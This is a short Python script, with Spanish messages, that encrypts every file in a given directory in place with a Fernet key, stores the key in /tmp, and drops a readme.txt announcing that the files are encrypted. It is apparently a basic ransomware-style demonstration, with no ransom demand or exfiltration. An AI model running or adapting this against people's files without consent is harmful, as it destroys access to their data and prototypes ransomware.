from cryptography.fernet import Fernet
import os
import sys

def generate_and_save_key():
    key = Fernet.generate_key()
    with open('/tmp/encryption_key.key', 'wb') as key_file:
        key_file.write(key)
    print(f"Clave generada y guardada: {key}")
    return key

def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        try:
            with open(item, 'rb') as file:
                file_data = file.read()
            encrypted_data = f.encrypt(file_data)
            with open(item, 'wb') as file:
                file.write(encrypted_data)
            print(f"Archivo encriptado: {item}")
        except Exception as e:
            print(f"Error al encriptar {item}: {str(e)}")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Error: Se requiere la ruta del archivo o directorio a encriptar.")
        sys.exit(1)

    path_to_encrypt = sys.argv[1]

    # Verificar si la ruta existe
    if not os.path.exists(path_to_encrypt):
        print("La ruta especificada no existe.")
        sys.exit(1)

    # Determinar si es un archivo o directorio
    if os.path.isfile(path_to_encrypt):
        full_path = [path_to_encrypt]
    else:
        items = os.listdir(path_to_encrypt)
        full_path = [os.path.join(path_to_encrypt, item) for item in items if os.path.isfile(os.path.join(path_to_encrypt, item))]

    key = generate_and_save_key()
    encrypt(full_path, key)
    print("Proceso de encriptación completado.")

    # Crear archivo readme.txt en el directorio del archivo/directorio encriptado
    readme_path = os.path.join(os.path.dirname(path_to_encrypt), 'readme.txt')
    with open(readme_path, 'w') as file:
        file.write('Ficheros encriptados correctamente!\n')